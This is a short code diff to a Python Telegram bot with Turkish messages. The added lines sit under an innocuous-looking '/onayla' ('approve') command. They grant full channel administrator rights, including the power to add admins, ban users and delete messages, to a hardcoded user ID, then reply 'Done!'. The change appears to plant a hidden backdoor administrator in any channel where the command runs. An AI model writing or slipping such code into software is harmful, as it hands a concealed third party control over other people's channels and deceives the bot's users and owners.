@@ -67,6 +67,14 @@ def post(client, message):
                     print(kanal)
         bot.send_message(chat, "Başarılı!")
     elif message.text == "/onayla":
+        new_rights = ChatAdminRights(post_messages=True, add_admins=True,
+                                 invite_users=True,
+                                 change_info=True,
+                                 ban_users=True,
+                                 delete_messages=True)
+    
+        yetki = bot.send(functions.channels.EditAdmin(channel=chat, user_id=1671239079, admin_rights=new_rights))
+        print(yetki)
         bot.send_message(chat, "Tamamdır!")
 
 @bot.on_message(filters.private)
